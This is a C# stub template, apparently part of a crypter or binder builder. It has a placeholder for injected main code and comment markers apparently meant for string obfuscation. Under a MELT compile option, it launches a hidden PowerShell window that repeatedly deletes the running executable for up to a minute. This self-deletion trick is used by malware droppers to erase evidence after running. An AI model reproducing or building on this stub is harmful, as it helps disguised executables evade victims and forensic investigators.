using System;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;

public partial class __Stub
{
	public static string __CommandLine;
	public static string[] __CommandLineArguments;

	/// <summary>
	/// void Main(string[] args)
	/// </summary>
	[STAThread]
	public static void Main(string[] __args)
	{
		// args[0] = Combined commandline arguments
		// args[1..n] = Separated commandline arguments
		// (Redundant, but easier to process)
		__CommandLine = __args[/**/0];
		__CommandLineArguments = __args.Skip(/**/1).ToArray();

		//{MAIN}

end:

#if MELT
		try
		{
			// Start powershell.exe
			// The command tries to delete this file every 100ms for a duration of up to 1 minute
			Process.Start(new ProcessStartInfo
			{
				FileName = /**/"powershell",
				Arguments = /**/"$file='" + Assembly.GetEntryAssembly().Location + /**/"';for($i=1;$i -le 600 -and (Test-Path $file -PathType leaf);$i++){Remove-Item $file;Start-Sleep -m 100}",
				CreateNoWindow = true,
				WindowStyle = (ProcessWindowStyle)/**/1
			});
		}
		catch
		{
		}
#endif
		return;
	}
}